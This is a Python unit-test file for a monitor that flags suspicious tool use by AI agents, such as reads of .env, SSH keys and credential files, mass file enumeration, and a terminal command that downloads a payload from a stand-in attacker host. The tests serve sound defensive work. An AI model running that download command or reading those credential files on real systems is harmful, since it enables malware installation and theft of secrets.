"""Tests for ToolMonitor."""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import unittest
from ai_telemetry.tool_monitor import ToolMonitor


class TestToolMonitor(unittest.TestCase):
    def setUp(self):
        self.monitor = ToolMonitor()

    def _analyze(self, tool_type: str, target: str = "") -> dict:
        event = {"event_type": "tool_invocation", "tool_type": tool_type, "target": target}
        result = self.monitor.analyze(event)
        return result.get("tool_analysis", {})

    # --- Positive Test Cases ---
    def test_sensitive_file_env(self):
        analysis = self._analyze("file_read", target="/home/user/.env")
        self.assertTrue(analysis["has_anomaly"])
        anomaly_types = [a["type"] for a in analysis["anomalies"]]
        self.assertIn("SENSITIVE_FILE_ACCESS", anomaly_types)

    def test_sensitive_file_ssh_key(self):
        analysis = self._analyze("file_read", target="/home/user/.ssh/id_rsa")
        self.assertTrue(analysis["has_anomaly"])
        anomaly_types = [a["type"] for a in analysis["anomalies"]]
        self.assertIn("SENSITIVE_FILE_ACCESS", anomaly_types)

    def test_sensitive_file_credentials(self):
        analysis = self._analyze("file_read", target="C:\\Users\\Admin\\credentials.txt")
        self.assertTrue(analysis["has_anomaly"])

    def test_suspicious_terminal_curl(self):
        analysis = self._analyze("terminal_execute", target="curl http://attacker.com/payload.exe -o malware.exe")
        self.assertTrue(analysis["has_anomaly"])
        anomaly_types = [a["type"] for a in analysis["anomalies"]]
        self.assertIn("SUSPICIOUS_TERMINAL", anomaly_types)

    def test_mass_enumeration(self):
        """Reading multiple files continuously -> MASS_FILE_ENUMERATION."""
        # Reset monitor
        self.monitor = ToolMonitor()
        self.monitor.mass_enum_limit = 3  # Hạ ngưỡng cho test
        for i in range(5):
            self._analyze("file_read", target=f"/path/file_{i}.txt")
        analysis = self._analyze("file_read", target="/path/file_extra.txt")
        self.assertTrue(analysis["has_anomaly"])
        anomaly_types = [a["type"] for a in analysis["anomalies"]]
        self.assertIn("MASS_FILE_ENUMERATION", anomaly_types)

    # --- Negative Test Cases ---
    def test_normal_file_read(self):
        self.monitor = ToolMonitor()  # Reset
        analysis = self._analyze("file_read", target="src/main.py")
        self.assertFalse(analysis["has_anomaly"])

    def test_normal_web_search(self):
        self.monitor = ToolMonitor()  # Reset
        analysis = self._analyze("web_search", target="python quicksort")
        self.assertFalse(analysis["has_anomaly"])


if __name__ == "__main__":
    unittest.main()
